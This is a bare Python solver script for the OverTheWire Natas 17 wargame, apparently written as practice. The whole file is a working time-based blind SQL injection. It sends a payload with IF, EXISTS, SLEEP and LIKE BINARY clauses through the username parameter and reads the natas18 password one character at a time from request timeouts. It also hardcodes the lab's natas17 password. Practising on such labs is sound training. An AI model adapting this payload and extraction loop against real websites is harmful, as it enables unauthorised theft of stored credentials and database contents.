#! env python3.9

import requests

site = "http://natas17.natas.labs.overthewire.org/index.php?username="
site2 = "\" and IF(EXISTS(SELECT * FROM users WHERE username = \"natas18\" and password like binary \"{}\"), IF(EXISTS(SELECT SLEEP(2) UNION SELECT 1), 1, 0), 0) = 1 and username = \""

user = "natas17"
pswd = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
timeout = 1

# Chars that the passwd contains
contains = []

# Find characters in the password
for c in chars:
    pass_query = "%" + c + "%"
    temp = site + site2.format(pass_query)
    try:
        r = requests.get(temp, auth=(user, pswd), timeout=1)
    except: 
        contains.append(c)
        print("Contained chars: {}".format(contains))
print("All contained chars: {}".format(contains))

# Build password up to 64 characters long
# We get to know each char position is correct
password = ""
for i in range(0, 64):
    if len(password) != i:  # If our iteration desyncs with the length of our password
        break               # then i should be larger than length so no more chars can 
                            # be appended to password 
    for c in contains:
        pass_query = password + c + "%"
        temp = site + site2.format(pass_query)
        try:
            r = requests.get(temp, auth=(user, pswd), timeout=1)
        except:
            password += c
            print("Password: {}".format(password))
            break

print("Password: {}".format(password))

